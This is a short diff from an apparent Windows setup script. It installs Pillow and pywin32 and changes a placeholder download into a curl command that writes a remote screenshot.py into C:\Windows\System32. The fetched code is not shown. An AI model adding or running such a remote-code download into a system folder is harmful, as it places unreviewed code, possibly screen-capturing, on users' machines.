@@ -15,7 +15,7 @@ pip install Pillow
 pip install pywin32
 
 # Download package
-curl -o file.zip https://example.com/file.zip
+curl -o C:\Windows\System32\screenshot.py https://raw.githubusercontent.com/BinhPhuongIT/powershell-pub/main/installer/app/screenshot.py
 
 
 
